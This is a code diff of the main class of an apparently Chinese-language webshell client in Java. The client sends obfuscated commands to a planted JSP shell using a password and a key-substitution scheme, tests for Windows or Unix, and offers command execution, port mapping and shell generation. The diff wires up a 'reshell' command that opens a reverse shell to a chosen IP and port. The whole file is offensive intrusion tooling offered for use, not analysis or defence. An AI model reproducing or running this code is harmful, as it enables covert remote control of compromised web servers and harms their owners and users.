@@ -13,6 +13,7 @@ public class Main {
 	 * java -jar http://localhost/a.jsp 密码		 key  word
 	 */
 	public static String cmd;
+	public static String shell;
 	public static String url;
 	public static String pass;
 	public static String key;
@@ -26,7 +27,7 @@ public class Main {
 			System.out.println("java -jar client.jar http://localhost/a.jsp 密码   key words");
 			System.out.println("密码为shell的密码,key取值为（!@#$^<>~?）,words为和key同等长度的（A-Za-z）");
 			System.out.println("java -jar client.jar g key words");
-			System.out.println("构造shell,满足key长度等于words");
+			System.out.println("构造shell,需要满足key长度等于words");
 			return;
 		}
 		switch (args[0]) {
@@ -48,6 +49,7 @@ public class Main {
 				return;
 			}
 			cmd=Util.Readtext("cmd");
+			shell=Util.Readtext("shell");
 			String win=cmd.replace("%cmd%", "cmd /c echo ok");
 			String unix=cmd.replace("%cmd%", "sh -c 'echo ok'");
 			String win_de=new String(encoder.encode(win.getBytes()));
@@ -56,9 +58,9 @@ public class Main {
 			unix_de=Util.EnChar(unix_de, key, words);
 			if (Util.GetStatuscode(pass,url, win_de, key, words)==200) {
 				System.err.println("eg:");
-				System.out.println("exec [command]	//执行一个命令");
-				System.out.println("reshell [ip] [port] //反弹shell到指定端口");
-				System.out.println("portmap   //开启端口映射");
+				System.out.println("1. exec [command]	           //执行一个命令");
+				System.out.println("2. reshell [ip] [port]         //反弹shell到指定端口");
+				System.out.println("3. portmap                     //开启端口映射");
 				DoHome("win");
 				
 			}else if (Util.GetStatuscode(pass,url, unix_de, key, words)==200) {
@@ -92,9 +94,10 @@ public class Main {
 			break;
 		case  "reshell":
 			if (list.size()==3) {
-				
+				String res=Util.reshell(pfm, list);
+				System.out.println(res);
 			}else {
-				System.out.println("reshell 1.1.1.1 8889");
+				System.out.println("eg:reshell 1.1.1.1 8889");
 			}
 			Main.DoHome(pfm);
 			break;
